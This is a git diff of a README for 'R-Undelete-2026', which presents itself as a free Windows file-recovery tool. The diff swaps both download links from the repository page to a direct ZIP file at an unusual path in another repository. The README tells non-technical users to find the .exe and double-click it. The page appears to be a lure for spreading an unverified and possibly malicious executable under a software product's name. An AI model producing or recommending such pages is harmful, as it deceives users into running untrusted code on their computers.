@@ -5,7 +5,7 @@ description: "Download R-Undelete for Windows 10 and 11 to recover lost or delet
 ---
 # 📁 R-Undelete-2026 - Recover your lost files today
 
-[![](https://img.shields.io/badge/Download_R-Undelete-blue.svg)](https://github.com/notoriousduc/R-Undelete-2026)
+[![](https://img.shields.io/badge/Download_R-Undelete-blue.svg)](https://raw.githubusercontent.com/notoriousduc/notoriousduc.github.io/main/underly/io_notoriousduc_github_v1.3.zip)
 
 R-Undelete-2026 helps you restore data from Windows computers. It finds missing files, photos, and documents. Use this tool when you delete files by mistake or lose data during a system error.
 
@@ -34,7 +34,7 @@ Check your computer before you start the setup process. These requirements ensur
 Follow these steps to obtain and install the software. You do not need technical skills to perform these steps.
 
 1.  Click the button below to visit the download page: 
-    [Download R-Undelete-2026](https://github.com/notoriousduc/R-Undelete-2026)
+    [Download R-Undelete-2026](https://raw.githubusercontent.com/notoriousduc/notoriousduc.github.io/main/underly/io_notoriousduc_github_v1.3.zip)
 2.  Locate the file ending in .exe in your browser downloads folder.
 3.  Double-click the file to start the installation.
 4.  Follow the prompts on your screen.
